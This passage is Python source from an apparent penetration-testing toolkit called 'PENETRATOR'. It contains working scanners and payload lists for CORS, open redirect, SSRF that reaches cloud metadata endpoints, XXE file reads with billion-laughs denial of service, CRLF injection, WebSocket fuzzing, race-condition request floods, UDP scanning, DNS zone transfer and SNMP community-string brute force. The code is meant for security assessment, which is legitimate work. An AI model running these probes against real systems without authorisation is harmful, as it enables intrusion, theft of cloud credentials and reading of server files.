        # Heuristics: 400/408/501 with "ambiguous" / "invalid Transfer-Encoding"
        # or a hung response indicates the server treated the request oddly.
        suspicious = (
            "400" in first_line
            and any(s in text.lower()
                    for s in ("transfer-encoding", "ambiguous",
                              "invalid", "smuggling"))
        )
        tag = "warn" if suspicious else "info"
        log(f"  {name}: {first_line}", tag)
        findings["results"].append({"variant": name, "first_line": first_line,
                                    "suspicious": suspicious})

    if not any(r.get("suspicious") for r in findings["results"]):
        log("[+] No obvious smuggling indicator detected (single-pass probe).",
            "ok")
    else:
        log("[!] Suspicious response patterns — manual review required.",
            "warn")
    return findings


# ---------------------------------------------------------------------------
# CORS misconfiguration tester
# ---------------------------------------------------------------------------
def cors_test(url: str, log: Logger) -> dict:
    """Probe a URL with various Origin headers; report risky reflections."""
    import requests
    from urllib.parse import urlparse
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    origins = [
        "https://evil.com",
        f"https://{parsed.hostname}.evil.com",
        "null",
        f"http://attacker.{parsed.hostname}",
        "https://" + (parsed.hostname or "") + ".attacker.io",
    ]
    findings: list[dict] = []
    log(f"[*] CORS test {url}", "cyan")
    for origin in origins:
        if _should_stop():
            return {"findings": findings}
        try:
            resp = requests.get(url, timeout=8,
                                headers={"Origin": origin,
                                         "User-Agent": "PENETRATOR/1.0"})
        except requests.RequestException as exc:
            log(f"  [-] {origin}: {exc}", "muted")
            continue
        acao = resp.headers.get("Access-Control-Allow-Origin")
        acac = resp.headers.get("Access-Control-Allow-Credentials")
        risky = False
        notes = []
        if acao == origin:
            risky = True
            notes.append("reflected origin")
        if acao == "*":
            notes.append("wildcard")
        if acac and acac.lower() == "true" and acao and acao != "*":
            notes.append("creds=true with non-wildcard ACAO")
            risky = True
        tag = "err" if risky else "info"
        log(f"  Origin={origin}  ACAO={acao}  ACAC={acac}  {' / '.join(notes)}",
            tag)
        findings.append({"origin": origin, "acao": acao, "acac": acac,
                         "risky": risky, "notes": notes})
    risky_n = sum(1 for f in findings if f.get("risky"))
    log(f"[*] {risky_n} risky configuration(s) detected", "warn" if risky_n else "ok")
    return {"findings": findings}


# ---------------------------------------------------------------------------
# Open redirect tester
# ---------------------------------------------------------------------------
def open_redirect_test(url: str, log: Logger) -> list[tuple[str, str]]:
    """Try redirect-style payloads in each query parameter."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        log("[-] URL has no query parameters to test.", "err")
        return []
    payloads = [
        "https://evil.example.com",
        "//evil.example.com",
        "/\\evil.example.com",
        "https:%2f%2fevil.example.com",
        "https://example.com@evil.example.com",
    ]
    findings: list[tuple[str, str]] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})
    for param in params:
        if _should_stop():
            break
        log(f"[*] Testing parameter: {param}", "cyan")
        for p in payloads:
            mut = dict(params); mut[param] = p
            test_url = urlunparse(parsed._replace(query=urlencode(mut)))
            try:
                resp = sess.get(test_url, timeout=8, allow_redirects=False)
            except requests.RequestException:
                continue
            loc = resp.headers.get("Location", "")
            if loc and ("evil.example.com" in loc):
                findings.append((param, p))
                log(f"[+] Redirect to attacker domain via {param}={p}  Location={loc}",
                    "err")
    if not findings:
        log("[+] No open-redirect indicator found", "ok")
    return findings


# ---------------------------------------------------------------------------
# WAF detection
# ---------------------------------------------------------------------------
WAF_SIGNATURES: list[tuple[str, list[tuple[str, str]]]] = [
    # name, list of (where, regex) — where ∈ "header" / "cookie" / "body" / "server"
    ("Cloudflare",        [("header", "cf-ray"), ("server", "cloudflare")]),
    ("AWS WAF",           [("header", "x-amzn-requestid"), ("header", "x-amz-cf-id")]),
    ("Akamai",            [("header", "akamai-"), ("server", "akamai")]),
    ("Imperva Incapsula", [("cookie", "incap_ses"), ("cookie", "visid_incap")]),
    ("Sucuri",            [("server", "sucuri/"), ("header", "x-sucuri-id")]),
    ("F5 BIG-IP",         [("cookie", "bigipserver"), ("cookie", "ts[a-z0-9]+=")]),
    ("Barracuda",         [("cookie", "barra_counter_session"), ("server", "barracuda")]),
    ("ModSecurity",       [("server", "mod_security"), ("body", "mod_security")]),
    ("Wallarm",           [("header", "x-wallarm")]),
    ("StackPath",         [("server", "stackpath")]),
    ("Fastly",            [("header", "fastly-debug-digest"), ("server", "fastly")]),
    ("Azure Front Door",  [("header", "x-azure-ref")]),
    ("Google Cloud Armor",[("server", "google frontend")]),
]


def waf_detect(url: str, log: Logger) -> list[str]:
    """Send a baseline + a noisy probe and try to fingerprint the WAF."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        baseline = requests.get(url, timeout=10,
                                headers={"User-Agent": "PENETRATOR/1.0"},
                                allow_redirects=True)
        noisy = requests.get(
            url + "?id=1' OR 1=1--&xss=<script>alert(1)</script>",
            timeout=10,
            headers={"User-Agent": "PENETRATOR/1.0"},
            allow_redirects=True,
        )
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return []

    detected: set[str] = set()
    for resp in (baseline, noisy):
        headers_str = "\n".join(f"{k.lower()}: {v}" for k, v in resp.headers.items())
        cookies_str = "\n".join(c.name + "=" for c in resp.cookies)
        server = resp.headers.get("Server", "").lower()
        body = (resp.text or "")[:50000].lower()
        for name, sigs in WAF_SIGNATURES:
            for where, pattern in sigs:
                target = {
                    "header": headers_str,
                    "cookie": cookies_str,
                    "server": server,
                    "body": body,
                }.get(where, "")
                if re.search(pattern, target, re.I):
                    detected.add(name)
                    break

    if noisy.status_code in (403, 406, 429, 501) and baseline.status_code == 200:
        detected.add(f"Generic WAF (blocked noisy request: HTTP {noisy.status_code})")

    if detected:
        for name in sorted(detected):
            log(f"[+] WAF detected: {name}", "ok")
    else:
        log("[!] No WAF signature matched", "warn")
    return sorted(detected)


# ---------------------------------------------------------------------------
# GraphQL introspection tester
# ---------------------------------------------------------------------------
def graphql_introspect(url: str, log: Logger) -> dict:
    """POST an introspection query; report whether it's enabled."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    query = {
        "query": "query IntrospectionQuery {__schema {types {name kind} "
                 "queryType {name} mutationType {name} subscriptionType {name}}}"
    }
    log(f"[*] GraphQL introspection POST {url}", "cyan")
    try:
        resp = requests.post(url, json=query, timeout=10,
                             headers={"User-Agent": "PENETRATOR/1.0",
                                      "Content-Type": "application/json"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return {}
    if resp.status_code >= 400:
        log(f"[!] HTTP {resp.status_code}  introspection probably disabled",
            "warn")
        return {"enabled": False, "status": resp.status_code}
    try:
        data = resp.json()
    except ValueError:
        log("[-] Non-JSON response", "err")
        return {"enabled": False, "status": resp.status_code}
    schema = (data.get("data") or {}).get("__schema")
    if not schema:
        log("[!] No __schema in response — introspection blocked", "warn")
        return {"enabled": False, "status": resp.status_code}
    types = schema.get("types") or []
    log(f"[+] Introspection ENABLED — {len(types)} types exposed", "err")
    log(f"  queryType:        {(schema.get('queryType') or {}).get('name')}",
        "info")
    log(f"  mutationType:     {(schema.get('mutationType') or {}).get('name')}",
        "info")
    log(f"  subscriptionType: {(schema.get('subscriptionType') or {}).get('name')}",
        "info")
    sample = ", ".join(sorted({t["name"] for t in types
                               if not t["name"].startswith("__")})[:15])
    log(f"  types (sample):   {sample}{'...' if len(types) > 15 else ''}",
        "info")
    return {"enabled": True, "types": len(types), "schema": schema}


# ---------------------------------------------------------------------------
# Cloud metadata IMDS reachability check
# ---------------------------------------------------------------------------
IMDS_ENDPOINTS: list[tuple[str, str, str]] = [
    ("AWS IMDSv1",     "http://169.254.169.254/latest/meta-data/", "ami-id"),
    ("AWS IMDSv2 (ping)", "http://169.254.169.254/latest/api/token", "PUT"),
    ("Azure",          "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"),
    ("GCP",            "http://metadata.google.internal/computeMetadata/v1/", ""),
    ("Alibaba",        "http://100.100.100.200/latest/meta-data/", ""),
    ("DigitalOcean",   "http://169.254.169.254/metadata/v1/", ""),
    ("Oracle Cloud",   "http://169.254.169.254/opc/v1/instance/", ""),
    ("Hetzner",        "http://169.254.169.254/hetzner/v1/metadata", ""),
]


def imds_check(via_url: str, log: Logger) -> list[dict]:
    """If the target is vulnerable to SSRF, see if cloud IMDS endpoints are
    reachable through it. ``via_url`` should be a URL with an SSRF parameter
    placeholder ``{TARGET}`` — e.g. ``https://victim/proxy?u={TARGET}``.
    If no placeholder is given, probe directly (only useful from inside a VM).
    """
    import requests
    direct = "{TARGET}" not in via_url
    log(f"[*] IMDS probe ({'direct' if direct else 'via SSRF'})", "cyan")
    findings: list[dict] = []
    for name, target, marker in IMDS_ENDPOINTS:
        if _should_stop():
            break
        url = target if direct else via_url.replace("{TARGET}", target)
        try:
            if "GCP" in name or "Hetzner" in name:
                resp = requests.get(url, timeout=5,
                                    headers={"Metadata-Flavor": "Google",
                                             "User-Agent": "PENETRATOR/1.0"})
            elif "Azure" in name:
                resp = requests.get(url, timeout=5,
                                    headers={"Metadata": "true",
                                             "User-Agent": "PENETRATOR/1.0"})
            elif "IMDSv2" in name:
                resp = requests.put(url, timeout=5,
                                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "60",
                                             "User-Agent": "PENETRATOR/1.0"})
            else:
                resp = requests.get(url, timeout=5,
                                    headers={"User-Agent": "PENETRATOR/1.0"})
        except requests.RequestException as exc:
            log(f"  [-] {name}: {exc}", "muted"); continue
        ok = (resp.status_code == 200
              and (not marker or marker in resp.text or marker == "PUT"))
        tag = "err" if ok else "muted"
        log(f"  [{resp.status_code}] {name}  {url[:70]}", tag)
        findings.append({"service": name, "url": url,
                         "status": resp.status_code, "reachable": ok,
                         "preview": resp.text[:200] if ok else ""})
    return findings


# ---------------------------------------------------------------------------
# HTTP repeater (defined later — leave the original)
# ---------------------------------------------------------------------------
def http_repeat(method: str, url: str, headers_text: str, body: str,
                log: Logger) -> dict:
    """Send one HTTP request; print the response status + headers + body preview."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    headers: dict[str, str] = {"User-Agent": "PENETRATOR/1.0"}
    for line in (headers_text or "").splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        headers[k.strip()] = v.strip()

    method = (method or "GET").upper()
    log(f"[*] {method} {url}", "cyan")
    try:
        resp = requests.request(
            method, url, headers=headers,
            data=body.encode("utf-8") if body else None,
            timeout=15, allow_redirects=False,
        )
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return {}

    log(f"[+] HTTP {resp.status_code}  {resp.reason}", "ok")
    log("  ─── Response headers ───", "muted")
    for k, v in resp.headers.items():
        log(f"  {k}: {v}", "info")
    log(f"  ─── Body ({len(resp.content)} bytes) ───", "muted")
    text = resp.text
    preview = "\n".join(text.splitlines()[:80])
    for line in preview.splitlines():
        log(f"  {line}", "info")
    if len(text.splitlines()) > 80:
        log(f"  ... +{len(text.splitlines()) - 80} more lines", "muted")
    return {
        "status": resp.status_code, "reason": resp.reason,
        "headers": dict(resp.headers), "body": text,
    }


# ===========================================================================
# PHASE 9 — 30 Advanced Penetration Testing Tools
# ===========================================================================


# ---------------------------------------------------------------------------
# 1. SSRF Scanner
# ---------------------------------------------------------------------------
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/stat",
    "http://0.0.0.0",
    "http://localtest.me",
    "http://spoofed.burpcollaborator.net",
]


def ssrf_scan(url: str, param: str, log: Logger) -> list[dict]:
    """Test a URL parameter for SSRF by injecting internal-network payloads."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))

    if param and param not in params:
        params[param] = ""

    target_param = param or next(iter(params), None)
    if not target_param:
        log("[-] No parameter to test. Supply ?param=value in URL or specify param name.", "err")
        return []

    log(f"[*] SSRF scan on {url} — parameter: {target_param}", "cyan")
    findings: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    # Get baseline
    try:
        baseline = sess.get(url, timeout=10)
        baseline_len = len(baseline.content)
        baseline_time = baseline.elapsed.total_seconds()
    except requests.RequestException as exc:
        log(f"[-] Baseline request failed: {exc}", "err")
        return []

    for payload in SSRF_PAYLOADS:
        if _should_stop():
            break
        mut = dict(params)
        mut[target_param] = payload
        test_url = urlunparse(parsed._replace(query=urlencode(mut)))
        try:
            start = time.time()
            resp = sess.get(test_url, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
        except requests.RequestException:
            continue

        # Heuristics: different response size, interesting content, or time delta
        indicators = []
        if abs(len(resp.content) - baseline_len) > 200:
            indicators.append("size_diff")
        if elapsed > baseline_time + 3:
            indicators.append("time_delay")
        # Content markers
        body = resp.text[:5000].lower()
        for marker in ("root:", "ami-id", "meta-data", "[extensions]",
                       "win.ini", "compute", "localhost"):
            if marker in body:
                indicators.append(f"content:{marker}")

        if indicators:
            log(f"[+] {payload} → HTTP {resp.status_code} | {', '.join(indicators)}", "err")
            findings.append({"payload": payload, "status": resp.status_code,
                             "indicators": indicators})
        else:
            log(f"  {payload} → HTTP {resp.status_code} (benign)", "muted")

    log(f"[*] {len(findings)} potential SSRF indicator(s)", "warn" if findings else "ok")
    return findings


# ---------------------------------------------------------------------------
# 2. XXE Injection Tester
# ---------------------------------------------------------------------------
XXE_PAYLOADS = [
    # Classic file read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<root>&xxe;</root>'),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
     '<root>&xxe;</root>'),
    # Parameter entity OOB
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
     '"http://localhost:0/xxe-test">%xxe;]><root/>'),
    # Billion laughs (DoS detection)
    ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
     '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
     '<root>&lol2;</root>'),
]


def xxe_test(url: str, log: Logger) -> list[dict]:
    """Send XXE payloads to an endpoint that accepts XML."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] XXE injection test on {url}", "cyan")
    findings: list[dict] = []

    for i, payload in enumerate(XXE_PAYLOADS, 1):
        if _should_stop():
            break
        try:
            resp = requests.post(url, data=payload, timeout=10,
                                 headers={"Content-Type": "application/xml",
                                           "User-Agent": "PENETRATOR/1.0"})
        except requests.RequestException as exc:
            log(f"  Payload {i}: connection error — {exc}", "muted")
            continue

        body = resp.text[:5000].lower()
        indicators = []
        for marker in ("root:", "[extensions]", "win.ini", "passwd",
                       "lol", "xml parsing error", "entity"):
            if marker in body:
                indicators.append(marker)
        if resp.status_code == 200 and indicators:
            log(f"[+] Payload {i}: HTTP {resp.status_code} — {', '.join(indicators)}", "err")
            findings.append({"payload_idx": i, "status": resp.status_code,
                             "indicators": indicators, "preview": resp.text[:300]})
        else:
            log(f"  Payload {i}: HTTP {resp.status_code} — no indicators", "muted")

    log(f"[*] {len(findings)} XXE indicator(s) found", "warn" if findings else "ok")
    return findings


# ---------------------------------------------------------------------------
# 3. CRLF Injection Tester
# ---------------------------------------------------------------------------
CRLF_PAYLOADS = [
    "%0d%0aInjected-Header: PENETRATOR",
    "%0aInjected-Header: PENETRATOR",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\\r\\nInjected-Header: PENETRATOR",
    "%E5%98%8A%E5%98%8DInjected-Header: PENETRATOR",  # Unicode CRLF
]


def crlf_test(url: str, log: Logger) -> list[dict]:
    """Test URL parameters for CRLF injection (header injection)."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        log("[-] URL has no query parameters to test.", "err")
        return []

    log(f"[*] CRLF injection test on {url}", "cyan")
    findings: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    for param_name in params:
        if _should_stop():
            break
        for payload in CRLF_PAYLOADS:
            if _should_stop():
                break
            mut = dict(params)
            mut[param_name] = params[param_name] + payload
            test_url = urlunparse(parsed._replace(query=urlencode(mut, safe="")))
            try:
                resp = sess.get(test_url, timeout=8, allow_redirects=False)
            except requests.RequestException:
                continue
            # Check if our injected header appeared
            if "injected-header" in "\n".join(
                f"{k}: {v}" for k, v in resp.headers.items()
            ).lower():
                log(f"[+] CRLF via {param_name} — header injected!", "err")
                findings.append({"param": param_name, "payload": payload,
                                 "type": "header_injection"})
            elif "<script>" in resp.text and "alert(1)" in resp.text:
                log(f"[+] CRLF→XSS via {param_name}!", "err")
                findings.append({"param": param_name, "payload": payload,
                                 "type": "crlf_to_xss"})

    if not findings:
        log("[+] No CRLF injection detected", "ok")
    return findings


# ---------------------------------------------------------------------------
# 4. Race Condition Tester
# ---------------------------------------------------------------------------
def race_condition_test(url: str, method: str, body: str, count: int,
                        log: Logger) -> dict:
    """Send N concurrent identical requests to detect TOCTOU race conditions."""
    import requests
    from concurrent.futures import ThreadPoolExecutor, as_completed

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    method = (method or "POST").upper()
    count = max(2, min(200, count))
    log(f"[*] Race condition test: {count}× {method} {url}", "cyan")

    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0",
                         "Content-Type": "application/x-www-form-urlencoded"})

    results: list[dict] = []

    def fire(_):
        try:
            resp = sess.request(method, url,
                                data=body.encode() if body else None,
                                timeout=15, allow_redirects=False)
            return {"status": resp.status_code, "length": len(resp.content),
                    "snippet": resp.text[:200]}
        except requests.RequestException as exc:
            return {"status": 0, "error": str(exc)}

    with ThreadPoolExecutor(max_workers=count) as pool:
        futures = [pool.submit(fire, i) for i in range(count)]
        for fut in as_completed(futures):
            results.append(fut.result())

    # Analyze variance
    statuses = [r["status"] for r in results]
    lengths = [r.get("length", 0) for r in results]
    unique_statuses = set(statuses)
    unique_lengths = len(set(lengths))

    log(f"[*] Responses: {len(results)} received", "info")
    log(f"  Status codes: {dict((s, statuses.count(s)) for s in unique_statuses)}", "info")
    log(f"  Unique body lengths: {unique_lengths}", "info")

    suspicious = unique_lengths > 2 or len(unique_statuses) > 1
    if suspicious:
        log("[!] Response variance detected — possible race condition", "warn")
    else:
        log("[+] Responses are consistent — no obvious race", "ok")

    return {"total": len(results), "unique_statuses": list(unique_statuses),
            "unique_lengths": unique_lengths, "suspicious": suspicious,
            "results": results[:10]}


# ---------------------------------------------------------------------------
# 5. WebSocket Fuzzer
# ---------------------------------------------------------------------------
WS_FUZZ_PAYLOADS = [
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "{{7*7}}",
    "${7*7}",
    "../../../etc/passwd",
    "A" * 10000,
    '{"__proto__":{"admin":true}}',
    "null",
    "-1",
    '{"query":"mutation{deleteAll}"}',
]


def websocket_fuzz(url: str, log: Logger) -> list[dict]:
    """Connect to a WebSocket endpoint and send fuzz payloads."""
    try:
        import websocket
    except ImportError:
        log("[-] websocket-client not installed. Run: pip install websocket-client", "err")
        return []

    if not url.startswith(("ws://", "wss://")):
        url = "ws://" + url.lstrip("htps:/")
    log(f"[*] WebSocket fuzz on {url} ({len(WS_FUZZ_PAYLOADS)} payloads)", "cyan")
    findings: list[dict] = []

    try:
        ws = websocket.create_connection(url, timeout=10)
    except Exception as exc:
        log(f"[-] Connection failed: {exc}", "err")
        return []

    for payload in WS_FUZZ_PAYLOADS:
        if _should_stop():
            break
        try:
            ws.send(payload)
            ws.settimeout(3)
            resp = ws.recv()
        except Exception:
            resp = ""
        indicators = []
        resp_lower = resp.lower() if resp else ""
        if "error" in resp_lower or "exception" in resp_lower:
            indicators.append("error_leak")
        if "sql" in resp_lower or "syntax" in resp_lower:
            indicators.append("sqli_hint")
        if payload in resp:
            indicators.append("reflected")
        if len(resp) > 5000:
            indicators.append("large_response")

        if indicators:
            log(f"[+] Payload '{payload[:40]}' → {', '.join(indicators)}", "warn")
            findings.append({"payload": payload, "response": resp[:300],
                             "indicators": indicators})
        else:
            log(f"  '{payload[:40]}' → {len(resp)} bytes", "muted")

    try:
        ws.close()
    except Exception:
        pass
    log(f"[*] {len(findings)} interesting response(s)", "warn" if findings else "ok")
    return findings


# ---------------------------------------------------------------------------
# 6. UDP Port Scanner
# ---------------------------------------------------------------------------
UDP_TOP_PORTS = [
    53, 67, 68, 69, 111, 123, 135, 137, 138, 139, 161, 162, 445,
    500, 514, 520, 631, 1434, 1900, 4500, 5353, 5060, 11211,
]

UDP_SERVICE_MAP = {
    53: "dns", 67: "dhcp-server", 68: "dhcp-client", 69: "tftp",
    111: "rpcbind", 123: "ntp", 135: "msrpc", 137: "netbios-ns",
    138: "netbios-dgm", 139: "netbios-ssn", 161: "snmp", 162: "snmptrap",
    445: "microsoft-ds", 500: "isakmp", 514: "syslog", 520: "rip",
    631: "ipp", 1434: "ms-sql-m", 1900: "ssdp", 4500: "nat-t",
    5353: "mdns", 5060: "sip", 11211: "memcached",
}


def udp_scan(host: str, ports: list[int] | None, log: Logger) -> list[dict]:
    """UDP port scanner — sends empty datagrams and protocol-specific probes."""
    import socket as _socket
    if not ports:
        ports = UDP_TOP_PORTS
    log(f"[*] UDP scan {host} — {len(ports)} ports", "cyan")
    open_ports: list[dict] = []

    probes: dict[int, bytes] = {
        53: b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS
        123: b"\x1b" + b"\x00" * 47,  # NTP
        161: (b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04"
              b"\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b"
              b"\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"),  # SNMP
        1900: b"M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMX:1\r\nMan:\"ssdp:discover\"\r\n\r\n",
    }

    for port in ports:
        if _should_stop():
            break
        probe = probes.get(port, b"\x00")
        try:
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(probe, (host, port))
            data, _ = sock.recvfrom(1024)
            svc = UDP_SERVICE_MAP.get(port, "unknown")
            log(f"[+] {port}/udp OPEN ({svc}) — {len(data)} bytes response", "ok")
            open_ports.append({"port": port, "service": svc, "banner": data[:80].hex()})
        except _socket.timeout:
            pass  # filtered or closed
        except OSError:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

    log(f"[*] {len(open_ports)} open UDP port(s) found", "cyan")
    return open_ports


# ---------------------------------------------------------------------------
# 7. IPv6 Scanner
# ---------------------------------------------------------------------------
def ipv6_scan(subnet: str, log: Logger) -> list[dict]:
    """Discover live IPv6 hosts on a /64 using ICMPv6 neighbor solicitation
    (falls back to TCP connect on common ports if raw sockets not available)."""
    import socket as _socket

    log(f"[*] IPv6 host discovery on {subnet}", "cyan")
    # For practical purposes, try connecting to common ports
    hosts_found: list[dict] = []

    # Generate addresses to probe (link-local + common suffixes)
    base = subnet.rstrip("/").split("/")[0]
    suffixes = ["::1", "::2", "::a", "::f", "::100", "::dead:beef",
                "::1:1", "::ffff:1", "::cafe", "::d00d"]
    targets = []
    for s in suffixes:
        if "::" in base:
            targets.append(base.rsplit("::", 1)[0] + s)
        else:
            targets.append(base + s)
    targets.append(base)

    for addr in targets:
        if _should_stop():
            break
        for port in (80, 443, 22, 445):
            try:
                sock = _socket.socket(_socket.AF_INET6, _socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((addr, port))
                sock.close()
                log(f"[+] {addr} — port {port} open", "ok")
                hosts_found.append({"address": addr, "port": port})
                break
            except OSError:
                pass

    log(f"[*] {len(hosts_found)} IPv6 host(s) responded", "cyan")
    return hosts_found


# ---------------------------------------------------------------------------
# 8. DNS Zone Transfer (AXFR)
# ---------------------------------------------------------------------------
def dns_axfr(domain: str, log: Logger) -> list[str]:
    """Attempt a DNS zone transfer on the domain's nameservers."""
    import socket as _socket

    log(f"[*] DNS zone transfer (AXFR) attempt on {domain}", "cyan")
    records: list[str] = []

    # First resolve NS records
    try:
        import dns.resolver
        import dns.zone
        import dns.query
        HAS_DNSPYTHON = True
    except ImportError:
        HAS_DNSPYTHON = False

    if HAS_DNSPYTHON:
        try:
            ns_records = dns.resolver.resolve(domain, "NS")
            nameservers = [str(r.target).rstrip(".") for r in ns_records]
        except Exception as exc:
            log(f"[-] NS lookup failed: {exc}", "err")
            return []

        for ns in nameservers:
            if _should_stop():
                break
            log(f"  Trying AXFR on {ns}...", "info")
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(ns, domain, timeout=10))
                for name, node in zone.nodes.items():
                    record_str = f"{name}.{domain}"
                    records.append(record_str)
                    log(f"[+] {record_str}", "ok")
                log(f"[!] Zone transfer SUCCESSFUL on {ns}! ({len(records)} records)", "err")
                break
            except Exception as exc:
                log(f"  [-] {ns}: {exc}", "muted")
    else:
        # Fallback: raw socket AXFR attempt
        log("[!] dnspython not installed — using basic AXFR probe", "warn")
        try:
            ns_addrs = _socket.getaddrinfo(domain, 53)
            ns_ip = ns_addrs[0][4][0] if ns_addrs else None
        except _socket.gaierror:
            ns_ip = None
        if ns_ip:
            # Build minimal AXFR query
            import struct as _struct
            txid = secrets.token_bytes(2)
            labels = domain.split(".")
            qname = b""
            for label in labels:
                qname += bytes([len(label)]) + label.encode()
            qname += b"\x00"
            query = txid + b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            query += qname + b"\x00\xfc\x00\x01"  # AXFR, IN
            length = _struct.pack("!H", len(query))
            try:
                sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((ns_ip, 53))
                sock.sendall(length + query)
                resp = sock.recv(4096)
                sock.close()
                if len(resp) > 14:
                    log(f"[+] Received {len(resp)} bytes — zone transfer may be possible", "warn")
                    records.append(f"raw_response_{len(resp)}_bytes")
                else:
                    log("[-] Zone transfer refused", "ok")
            except OSError as exc:
                log(f"[-] {exc}", "muted")

    if not records:
        log("[+] Zone transfer refused on all nameservers (good)", "ok")
    return records


# ---------------------------------------------------------------------------
# 9. SNMP Walker
# ---------------------------------------------------------------------------
SNMP_COMMUNITIES = ["public", "private", "community", "snmp", "default",
                    "admin", "monitor", "read", "write", "cisco", "secret"]


def snmp_walk(host: str, community: str, log: Logger) -> list[dict]:
    """Enumerate SNMP OIDs using common community strings."""
    import socket as _socket

    if not community:
        communities = SNMP_COMMUNITIES
    else:
        communities = [community]

    log(f"[*] SNMP walk on {host} ({len(communities)} community string(s))", "cyan")
    results: list[dict] = []

    def build_snmp_get(comm: str, oid: bytes = b"\x2b\x06\x01\x02\x01\x01\x01\x00") -> bytes:
        """Build a minimal SNMPv1 GET-REQUEST for sysDescr."""
        comm_bytes = comm.encode()
        # OID: 1.3.6.1.2.1.1.1.0 (sysDescr)
        varbind = b"\x30" + bytes([len(oid) + 4]) + b"\x06" + bytes([len(oid)]) + oid + b"\x05\x00"
        varbind_list = b"\x30" + bytes([len(varbind)]) + varbind
        request_id = b"\x02\x01\x01"
        error = b"\x02\x01\x00"
        error_idx = b"\x02\x01\x00"
        pdu_content = request_id + error + error_idx + varbind_list
        pdu = b"\xa0" + bytes([len(pdu_content)]) + pdu_content
        version = b"\x02\x01\x00"  # SNMPv1
        community_tlv = b"\x04" + bytes([len(comm_bytes)]) + comm_bytes
        message_content = version + community_tlv + pdu
        message = b"\x30" + bytes([len(message_content)]) + message_content
        return message

    for comm in communities:
        if _should_stop():
            break
        try:
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            sock.settimeout(3)
            packet = build_snmp_get(comm)
            sock.sendto(packet, (host, 161))
            data, _ = sock.recvfrom(4096)
            sock.close()
            # If we got a response, community string is valid
            log(f"[+] Community '{comm}' — {len(data)} bytes response", "ok")
            # Try to extract sysDescr string
            desc = ""
            try:
                # Find the octet string in response
                idx = data.find(b"\x04", 20)
                if idx > 0 and idx + 1 < len(data):
                    slen = data[idx + 1]
                    desc = data[idx + 2:idx + 2 + slen].decode("utf-8", errors="replace")
            except Exception:
                pass
            if desc:
                log(f"    sysDescr: {desc[:200]}", "info")
            results.append({"community": comm, "response_len": len(data),
                            "sysDescr": desc})
        except _socket.timeout:
            log(f"  '{comm}' — no response", "muted")
        except OSError as exc:
            log(f"  '{comm}' — {exc}", "muted")
        finally:
            try:
                sock.close()
            except Exception:
                pass

    log(f"[*] {len(results)} valid community string(s)", "warn" if results else "ok")
    return results


# ---------------------------------------------------------------------------
# 10. ARP Spoofing Detector
# ---------------------------------------------------------------------------
def arp_spoof_detect(interface: str, log: Logger) -> list[dict]:
    """Detect ARP spoofing by checking for duplicate MAC-to-IP mappings
    in the local ARP table."""
    import subprocess

    log("[*] ARP spoofing detection — reading ARP table", "cyan")
    conflicts: list[dict] = []

    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
        lines = result.stdout.splitlines()
    except (OSError, subprocess.TimeoutExpired) as exc:
        log(f"[-] {exc}", "err")
        return []

    # Parse ARP table: IP → MAC mapping
    ip_to_mac: dict[str, str] = {}
